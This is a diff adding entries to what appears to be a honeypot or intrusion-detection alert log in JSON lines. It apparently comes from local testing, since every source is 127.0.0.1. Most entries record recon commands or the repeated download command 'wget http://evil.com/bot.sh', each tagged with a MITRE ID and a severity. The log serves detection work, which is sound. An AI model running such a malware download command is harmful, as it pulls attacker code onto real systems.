@@ -1,2 +1,13 @@
 {"alert_time": "2026-01-29T18:01:22.370264Z", "src_ip": "127.0.0.1", "command": "wget http://evil.com/bot.sh", "severity": "CRITICAL", "mitre": "T1105"}
 {"alert_time": "2026-01-29T18:11:21.411696+00:00", "src_ip": "127.0.0.1", "command": "wget http://evil.com/bot.sh", "severity": "CRITICAL", "mitre": "T1105"}
+{"timestamp": "2026-01-29T19:48:14.028827+00:00", "src_ip": "127.0.0.1", "session": "cffada91888a", "command": "uname -a", "attack_type": "RECON", "severity": "LOW", "mitre": "T1082"}
+{"timestamp": "2026-01-29T19:48:14.029057+00:00", "src_ip": "127.0.0.1", "session": "cffada91888a", "command": "whoami", "attack_type": "RECON", "severity": "LOW", "mitre": "T1082"}
+{"timestamp": "2026-01-29T19:48:14.029140+00:00", "src_ip": "127.0.0.1", "session": "cffada91888a", "command": "id", "attack_type": "RECON", "severity": "LOW", "mitre": "T1082"}
+{"timestamp": "2026-01-29T19:48:14.029211+00:00", "src_ip": "127.0.0.1", "session": "cffada91888a", "command": "wget http://evil.com/bot.sh", "attack_type": "MALWARE_DOWNLOAD", "severity": "CRITICAL", "mitre": "T1105"}
+{"timestamp": "2026-01-29T19:48:14.029280+00:00", "src_ip": "127.0.0.1", "session": "cffada91888a", "command": "wget http://evil.com/bot.sh", "attack_type": "MALWARE_DOWNLOAD", "severity": "CRITICAL", "mitre": "T1105"}
+{"timestamp": "2026-01-29T19:48:14.029349+00:00", "src_ip": "127.0.0.1", "session": "cffada91888a", "command": "exit", "attack_type": "UNKNOWN", "severity": "INFO", "mitre": "N/A"}
+{"timestamp": "2026-01-29T19:48:14.029518+00:00", "src_ip": "127.0.0.1", "session": "0198aea461c7", "command": "uname -a", "attack_type": "RECON", "severity": "LOW", "mitre": "T1082"}
+{"timestamp": "2026-01-29T19:48:14.029583+00:00", "src_ip": "127.0.0.1", "session": "0198aea461c7", "command": "wget http://evil.com/bot.sh", "attack_type": "MALWARE_DOWNLOAD", "severity": "CRITICAL", "mitre": "T1105"}
+{"timestamp": "2026-01-29T19:55:06.666619+00:00", "src_ip": "127.0.0.1", "session": "cffada91888a", "command": "wget http://evil.com/bot.sh", "attack_type": "MALWARE_DOWNLOAD", "severity": "CRITICAL", "mitre": "T1105"}
+{"timestamp": "2026-01-29T19:55:06.679196+00:00", "src_ip": "127.0.0.1", "session": "cffada91888a", "command": "wget http://evil.com/bot.sh", "attack_type": "MALWARE_DOWNLOAD", "severity": "CRITICAL", "mitre": "T1105"}
+{"timestamp": "2026-01-29T19:55:06.679706+00:00", "src_ip": "127.0.0.1", "session": "0198aea461c7", "command": "wget http://evil.com/bot.sh", "attack_type": "MALWARE_DOWNLOAD", "severity": "CRITICAL", "mitre": "T1105"}
